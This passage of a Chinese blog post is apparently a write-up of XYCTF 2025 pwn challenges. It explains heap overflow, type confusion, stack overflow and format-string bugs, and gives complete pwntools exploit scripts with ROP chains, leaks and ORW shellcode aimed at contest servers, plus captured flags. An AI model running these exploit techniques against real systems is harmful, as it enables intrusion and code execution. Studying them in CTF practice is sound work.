<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line">message Message_request&#123;</span><br><span class="line">    required int32 <span class="built_in">id</span> = <span class="number">1</span>;</span><br><span class="line">    required string sender = <span class="number">2</span>;</span><br><span class="line">    required uint32 <span class="built_in">len</span> = <span class="number">3</span>;</span><br><span class="line">    required <span class="built_in">bytes</span> content = <span class="number">4</span>;</span><br><span class="line">    required int32 actionid = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message Message_response&#123;</span><br><span class="line">    required int32 <span class="built_in">id</span> = <span class="number">1</span>;</span><br><span class="line">    required string receiver = <span class="number">2</span>;</span><br><span class="line">    required int32 status_code = <span class="number">3</span>;</span><br><span class="line">    optional string error_message = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>为了美观起见，这里我们在IDA中设置这两个结构体，然后把对应类型的变量改为我们自定义的结构体类型，好看一点。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406140114087.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406140204662.png"
                      class=""
                >
<p>主要功能一共有3个，其中我们要用到的只有action
1和2，0只是把我们输入的内容打印一遍（这里说不定可以劫持puts_got为system，但我没试）。其中action
1中会复制内容到我们指定id的chunk中，这里我们要先看一下这个堆块申请的逻辑。实际上申请的这个堆块分为管理块和数据块。管理块data域第一个是返回地址，而data域第二个内容就是指向数据块的data域。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406140338256.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406140433554.png"
                      class=""
                >
<p>由于在实际交互之前也alloc了2次，这里我们可以看前两堆块。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406140852376.png"
                      class=""
                >
<p>这里我们的1号功能实际上可以进行堆溢出改写。比如我可以指定id为0，然后溢出覆盖id为1的管理块的数据域指针。</p>
<p>2号功能可以打印出指定id管理块数据域指针指向的内容，最多使用2次。</p>
<p>那么我们可以先溢出部分覆盖1号管理块的数据域指针，使其指向0号管理块的返回地址（也就是libc相关地址），这里要覆盖两个字节，1/16概率，本地可以先关aslr进行调试。然后用2号功能得到libc基址。之后可以再次改写1号块的数据域指针为<strong>environ</strong>来泄露栈相关地址。</p>
<p>最后我们把1号块的数据域指针覆盖成栈上的返回地址，注意是进入<strong>cp</strong>具体<strong>memcpy</strong>实现函数的返回地址，因为我们实际上前面覆盖时把1号块的返回地址覆盖了，最后release时会检测到直接退出程序。然后对1号块调用1号功能就可以覆盖返回地址了，执行我们的rop链。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> message_pb2</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./bot&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.94.15.198&quot;</span>,<span class="number">20531</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">sender,content,<span class="built_in">id</span>=<span class="number">1</span>,<span class="built_in">len</span>=<span class="number">1</span></span>):</span><br><span class="line">    req = message_pb2.Message_request()		<span class="comment">#创建结构体</span></span><br><span class="line">    <span class="comment">#各字段赋值</span></span><br><span class="line">    req.<span class="built_in">id</span> = <span class="built_in">id</span></span><br><span class="line">    req.<span class="built_in">len</span> = <span class="built_in">len</span></span><br><span class="line">    req.sender = sender</span><br><span class="line">    req.content = content</span><br><span class="line">    req.actionid = <span class="number">0</span> </span><br><span class="line">    payload = req.SerializeToString()		<span class="comment">#转化成proto的序列化字符串</span></span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendReq</span>(<span class="params"><span class="built_in">id</span>,sender,<span class="built_in">len</span>,content</span>):</span><br><span class="line">    req = message_pb2.Message_request()		<span class="comment">#创建结构体</span></span><br><span class="line">    <span class="comment">#各字段赋值</span></span><br><span class="line">    req.<span class="built_in">id</span> = <span class="built_in">id</span></span><br><span class="line">    req.<span class="built_in">len</span> = <span class="built_in">len</span></span><br><span class="line">    req.sender = sender</span><br><span class="line">    req.content = content</span><br><span class="line">    req.actionid = <span class="number">1</span></span><br><span class="line">    payload = req.SerializeToString()		<span class="comment">#转化成proto的序列化字符串</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">botReply</span>(<span class="params"><span class="built_in">id</span>,sender=<span class="string">&quot;admin&quot;</span>,<span class="built_in">len</span>=<span class="number">1</span>,content=<span class="string">b&quot;a&quot;</span></span>):</span><br><span class="line">    req = message_pb2.Message_request()		<span class="comment">#创建结构体</span></span><br><span class="line">    <span class="comment">#各字段赋值</span></span><br><span class="line">    req.<span class="built_in">id</span> = <span class="built_in">id</span></span><br><span class="line">    req.<span class="built_in">len</span> = <span class="built_in">len</span></span><br><span class="line">    req.sender = sender</span><br><span class="line">    req.content = content</span><br><span class="line">    req.actionid = <span class="number">2</span></span><br><span class="line">    payload = req.SerializeToString()		<span class="comment">#转化成proto的序列化字符串</span></span><br><span class="line">    p.send(payload)   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_protobuf</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 接收并解析服务器返回的 protobuf 数据 &quot;&quot;&quot;</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;TESTTESTTEST!\n&quot;</span>)</span><br><span class="line">    <span class="comment"># print(p.recvline())</span></span><br><span class="line">    response_data = p.recvline()[:-<span class="number">1</span>] </span><br><span class="line">    res = message_pb2.Message_response()</span><br><span class="line">    res.ParseFromString(response_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Received ID: <span class="subst">&#123;res.<span class="built_in">id</span>&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Received receiver: <span class="subst">&#123;res.receiver&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Received status_code: <span class="subst">&#123;res.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Received error_message: <span class="subst">&#123;res.error_message&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sendReq(<span class="number">0</span>,<span class="string">&quot;admin&quot;</span>,<span class="number">0x28</span>+<span class="number">2</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p16(<span class="number">0x22a0</span>))</span><br><span class="line">botReply(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;BOT MSG&quot;</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x29d90</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">environ = libc_base + libc.symbols[<span class="string">&quot;environ&quot;</span>]</span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029139</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="number">0x00000000001d8678</span></span><br><span class="line"></span><br><span class="line">sendReq(<span class="number">0</span>,<span class="string">&quot;admin&quot;</span>,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(environ))</span><br><span class="line">botReply(<span class="number">1</span>)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) </span><br><span class="line">log.success(<span class="string">&quot;stack:&quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sendReq(<span class="number">0</span>,<span class="string">&quot;admin&quot;</span>,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(stack-<span class="number">0x200</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sendReq(<span class="number">1</span>,<span class="string">&quot;admin&quot;</span>,<span class="number">0x20</span>,p64(ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv_protobuf()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406220530194.png"
                      class=""
                >
<p>XYCTF{eb7711df-94d9-4eb8-b94f-859dfaa638fe}</p>
<h4 id="pwn-奶龙回家">pwn-奶龙回家</h4>
<p>看沙箱，只能进行常规orw。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406125856838.png"
                      class=""
                >
<p>这题一开始给了栈上相关地址，但进行了随机偏移，不过因为是伪加密，所以可以确定这个偏移量。这里需要注意的是，用pwntools远程连接到服务器到这个程序<strong>time</strong>的运行会有一定延迟，所以我们本地算随机数种子时需要尝试加减一定的偏移量。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406121830285.png"
                      class=""
                >
<p>主要利用点在于有任意地址读和任意地址写，前面的v20的次数限制可以通过输入负数来进行<strong>type
confuse</strong>，（choice是int而v20是unsigned
int），然后v18的限制可以通过改写栈上变量来绕过。由于这题开了沙箱，所以不能进入调用system的分支。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406125556426.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406125348724.png"
                      class=""
                >
<p>任意地址读可以读got表泄露libc基址，然后绕过上述两个限制后，就可以往栈上任意写了，直接写orw的rop链。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line">glibc = ctypes.CDLL(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./nailong&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;47.94.217.82&quot;</span>,<span class="number">36901</span>)</span><br><span class="line">v0 = glibc.time(<span class="number">0</span>)-<span class="number">2</span>     <span class="comment">#remote -3</span></span><br><span class="line">glibc.srand(v0)</span><br><span class="line">elf = ELF(<span class="string">&quot;./nailong&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;rbp + offset:&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;end&quot;</span>)[:-<span class="number">3</span>])</span><br><span class="line">log.success(<span class="string">&quot;stack: &quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">rbp = stack - (glibc.rand() % <span class="number">0x1B0</span> + <span class="number">0x50</span>)</span><br><span class="line">log.success(<span class="string">&quot;rbp: &quot;</span>+<span class="built_in">hex</span>(rbp))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;xiao_peng_you_ni_zhi_dao_wo_yao_qu_ji_lou_ma&quot;</span>,<span class="string">&quot;-1&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readfunc</span>(<span class="params">addr</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;chose&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;what you want do?&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writefunc</span>(<span class="params">addr,data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;chose&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;what you want do?&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendafter(<span class="string">&quot;read you want&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writep64</span>(<span class="params">addr,data</span>):</span><br><span class="line">    writefunc(addr,data[:<span class="number">4</span>])</span><br><span class="line">    writefunc(addr+<span class="number">4</span>,data[<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0x404030)  </span></span><br><span class="line">readfunc(rbp+<span class="number">8</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x29d90</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029139</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000401650</span></span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000042759</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">writefunc(rbp-<span class="number">0x8044</span>,<span class="string">b&quot;\xff\xff\xff\xce&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">writep64(<span class="number">0x404500</span>,p64(<span class="number">0x67616c662f</span>))</span><br><span class="line">writep64(rbp+<span class="number">8</span>,p64(pop_rdi_ret))</span><br><span class="line">writep64(rbp+<span class="number">0x10</span>,p64(<span class="number">0x404500</span>))</span><br><span class="line">writep64(rbp+<span class="number">0x18</span>,p64(pop_rsi_ret))</span><br><span class="line">writep64(rbp+<span class="number">0x20</span>,p64(<span class="number">0</span>))</span><br><span class="line">writep64(rbp+<span class="number">0x28</span>,p64(pop_rdx_ret))</span><br><span class="line">writep64(rbp+<span class="number">0x30</span>,p64(<span class="number">0</span>))</span><br><span class="line">writep64(rbp+<span class="number">0x38</span>,p64(<span class="built_in">open</span>))</span><br><span class="line"></span><br><span class="line">writep64(rbp+<span class="number">0x40</span>,p64(pop_rdi_ret))</span><br><span class="line">writep64(rbp+<span class="number">0x48</span>,p64(<span class="number">3</span>))</span><br><span class="line">writep64(rbp+<span class="number">0x50</span>,p64(pop_rsi_ret))</span><br><span class="line">writep64(rbp+<span class="number">0x58</span>,p64(<span class="number">0x404500</span>))</span><br><span class="line">writep64(rbp+<span class="number">0x60</span>,p64(pop_rdx_ret))</span><br><span class="line">writep64(rbp+<span class="number">0x68</span>,p64(<span class="number">0x100</span>))</span><br><span class="line">writep64(rbp+<span class="number">0x70</span>,p64(read))</span><br><span class="line"></span><br><span class="line">writep64(rbp+<span class="number">0x78</span>,p64(pop_rdi_ret))</span><br><span class="line">writep64(rbp+<span class="number">0x80</span>,p64(<span class="number">1</span>))</span><br><span class="line">writep64(rbp+<span class="number">0x88</span>,p64(pop_rsi_ret))</span><br><span class="line">writep64(rbp+<span class="number">0x90</span>,p64(<span class="number">0x404500</span>))</span><br><span class="line">writep64(rbp+<span class="number">0x98</span>,p64(pop_rdx_ret))</span><br><span class="line">writep64(rbp+<span class="number">0xa0</span>,p64(<span class="number">0x100</span>))</span><br><span class="line">writep64(rbp+<span class="number">0xa8</span>,p64(write))</span><br><span class="line"></span><br><span class="line">writefunc(rbp-<span class="number">0x803C</span>,p32(<span class="number">0</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406220809627.png"
                      class=""
                >
<p>XYCTF{0b6fb9b7-e291-4037-9833-52b7f99a0ec0}</p>
<h4 id="pwn-明日方舟寻访模拟器">pwn-明日方舟寻访模拟器</h4>
<p>前面各种抽卡逻辑没有漏洞，漏洞点主要在于后面分享功能存在栈溢出。但溢出的不多，只能放下3个rop元素。利用的挑战点是执行完一遍后会把标准输出关了。一开始是想着先控制rbp回来到read函数读取到可控地址处，然后再栈迁移回来。后面发现有更简单的方法。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406120325178.png"
                      class=""
                >
<p>由于程序本身存在<code>pop rdi;ret</code>的gadget，程序里又有<strong>system</strong>函数，PIE保护也没开启，所以我们可以想办法让一些全局变量变成我们想要的值然后赋给rdi，之后直接<strong>call
system</strong>即可。这里选用<strong>sum_count</strong>这个全局变量，因为每次抽卡都可以累加，而且程序也提供批量抽卡功能（上限10000），那么我们直接把<strong>sum_count</strong>累加成<strong>sh</strong>，然后就能获取shell了。最后获取shell后，还需要把标准输出重定向到标准错误，这样才好有回显。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406121530077.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"><span class="comment"># libc = ctypes.CDLL(&quot;libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./arknights&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.94.217.82&quot;</span>,<span class="number">30781</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./arknights&quot;</span>)</span><br><span class="line"><span class="comment"># glibc = ELF(&quot;libc.so.6&quot;)</span></span><br><span class="line"><span class="comment"># /bin/sh:0x68732f6e69622f</span></span><br><span class="line"><span class="comment"># sh:0x6873-&gt;26739</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004018e5</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000401981</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000401393</span></span><br><span class="line">call_rax = <span class="number">0x0000000000401014</span></span><br><span class="line">system_plt = <span class="number">0x0000000000401130</span></span><br><span class="line">call_system = <span class="number">0x00000000004018FC</span></span><br><span class="line">start = <span class="number">0x0000000004011D0</span></span><br><span class="line">sum_count = <span class="number">0x405BCC</span></span><br><span class="line"></span><br><span class="line">p.sendline()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;请选择&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;请输入寻访次数&quot;</span>,<span class="string">&quot;10000&quot;</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;请选择&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;请输入寻访次数&quot;</span>,<span class="string">&quot;10000&quot;</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;请选择&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;请输入寻访次数&quot;</span>,<span class="string">&quot;6739&quot;</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;请选择&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;请选择&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x48</span> + p64(pop_rdi_ret) + p64(sum_count) + p64(call_system)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;请输入你的名字&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406220953049.png"
                      class=""
                >
<p>XYCTF{6edda96d-aacb-434b-8a42-60f78e5d8e56}</p>
<h4 id="pwn-girlfriend">pwn-girlfriend</h4>
<p>内置菜单，其中方法3 <strong>reply</strong>
中能往name全局变量读取大量字节，但name全局变量实际只有0x30的大小，那我们就可以在这个区域内布局后续要用到的rop链。而且这个函数还有格式化字符串漏洞，可以一次性把所有要用的地址以及canary都泄露出来。通过动调可知，canary在偏移15，libc相关地址在偏移17，程序相关地址在偏移19。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406115158364.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406115248326.png"
                      class=""
                >
<p>然后方法一 <strong>girlfriend</strong>
中我们刚好可以栈溢出覆盖返回地址，那么显然就是栈迁移到我们可控的name全局变量下面的位置，然后由于这题开了沙箱，所以我选择先用
<strong>mprotect</strong>
改一段可执行，然后直接写<strong>openat</strong>+<strong>sendfile</strong>的shellcode。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406115350378.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406115803805.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reply</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;name first&quot;</span>,name)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">girlfriend</span>(<span class="params">say</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;say to her?&quot;</span>,say)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;flowers?&quot;</span>,<span class="string">&quot;Y&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#-0x29d90</span></span><br><span class="line"><span class="comment"># p = process(&quot;./girlfriend&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;8.147.132.32&quot;</span>,<span class="number">20003</span>)</span><br><span class="line">payload = <span class="string">b&quot;%15$p.%17$p.%19$p&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>,<span class="string">b&quot;A&quot;</span>) + p32(<span class="number">0x100</span>) + p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">reply(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;your name:\n&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x1817</span></span><br><span class="line">log.success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="string">&quot;base:&quot;</span>+<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">ret = base + <span class="number">0x000000000000101a</span></span><br><span class="line">leave_ret = base + <span class="number">0x00000000000014f4</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f2e7</span></span><br><span class="line"><span class="comment"># fake_stack = base + 0x4500</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">pop_rbx_jmp_rax = libc_base + <span class="number">0x000000000008d848</span></span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000042759</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    xor rsi,rsi;</span></span><br><span class="line"><span class="string">    mov rbx,0x67616c662f;</span></span><br><span class="line"><span class="string">    push rbx;</span></span><br><span class="line"><span class="string">    mov rdx,0; </span></span><br><span class="line"><span class="string">    mov r10,0;</span></span><br><span class="line"><span class="string">    mov rdi,3;   </span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov eax,257; </span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rsi,3; </span></span><br><span class="line"><span class="string">    mov r10,50; </span></span><br><span class="line"><span class="string">    xor rdx,rdx;</span></span><br><span class="line"><span class="string">    mov rdi,rdx;</span></span><br><span class="line"><span class="string">    inc rdi;   </span></span><br><span class="line"><span 